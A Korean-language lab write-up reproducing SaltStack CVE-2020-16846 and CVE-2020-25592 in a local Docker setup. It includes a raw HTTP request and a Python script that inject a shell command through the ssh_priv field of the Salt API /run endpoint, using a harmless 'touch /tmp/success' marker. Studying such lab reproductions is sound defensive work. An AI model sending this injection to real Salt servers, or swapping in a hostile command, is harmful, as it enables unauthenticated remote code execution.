# CVE-2020-16846 실습

### 요약

- Salt는 동적 통신 버스를 기반으로 구축된 인프라 관리에 대한 새로운 접근 방식임
- 2020년 11월 SaltStack은 CVE-2020-16846 및 CVE-2020-25592라는 두 가지 취약점을 공식적으로 공개했음
- CVE-2020-25592는 임의의 사용자가 SSH 모듈을 사용할 수 있도록 허용함
- CVE-2020-16846은 사용자가 임의의 명령을 실행할 수 있도록 허용함
- 이 두 가지 취약점을 연결하면 무단 공격자가 Salt API를 통해 임의 명령을 실행할 수 있

### 환경 구성 및 실행

- 도커 환경 구축
    - docker compose up -d

- SaltStack -master가 시작된 후 다음 포트가 수신됨
    - 4505.4506 : 마스터와 미니언 사이의 다리 역할을 하는 SaltStakc -Master 서버
    - 8000 : Salt의 API 서버, SSL이 필요
    - 2222 : 컨테이너 내부의 SSH 서버
    
- [localhost:8000/run](http://localhost:8000/run) 서버 구축
    ![1](https://github.com/vlrhsgody/CVE_Docker/assets/106510018/69e2e445-35af-48f5-8d58-e9891e67073c)

    
    

### 취약점 재현 단계


- https://localhost:8000/run에 다음과 같은 요청을 보냄
    
    ```python
    POST /run HTTP/1.1
    Host: 127.0.0.1:8000
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: application/x-yaml
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 87
    
    token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b
    ```
    

### 익스플로잇 진행

- 위 요청을 보내는 파이썬 코드 작성
    
    ```python
    import requests
    
    url = "https://127.0.0.1:8000/run"
    
    headers = {
        "Host": "127.0.0.1:8000",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0",
        "Accept": "application/x-yaml",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    data = {
        "token": "12312",
        "client": "ssh",
        "tgt": "*",
        "fun": "a",
        "roster": "whip1ash",
        "ssh_priv": "aaa|touch /tmp/success;"
    }
    
    # SSL 검증을 비활성화하여 요청을 보냅니다.
    response = requests.post(url, headers=headers, data=data, verify=False)
    
    # 서버 응답을 출력합니다.
    print(response.text)
    ```
    
- touch /tmp/success 매개변수를 통해 성공 여부를 확인할 수 있음
    ![2](https://github.com/vlrhsgody/CVE_Docker/assets/106510018/329d31d1-793c-4560-8818-7b14aafe91c0)

